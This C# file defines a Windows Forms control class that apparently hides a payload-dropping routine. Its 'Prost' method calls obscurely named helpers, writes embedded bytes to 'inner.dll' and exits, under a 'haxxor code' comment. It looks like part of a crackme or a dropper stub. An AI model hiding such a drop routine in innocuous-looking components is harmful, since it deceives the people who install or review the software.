using System;
using System.ComponentModel;
using System.Windows.Forms;
using System.IO;

namespace amsu
{
	public class CustomControl8 : Control
	{
		private IContainer components;

		public CustomControl8()
		{
			this.InitializeComponent();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new Container();
		}

		protected override void OnPaint(PaintEventArgs pe)
		{
			base.OnPaint(pe);
		}

		public static byte[] Prost()
		{
			CustomControl7.Key2();
			CustomControl5.Cumi();

            // haxxor code!!
            File.WriteAllBytes("inner.dll", CustomControl3._data);
            Environment.Exit(1337);

			return CustomControl3._data;
		}
	}
}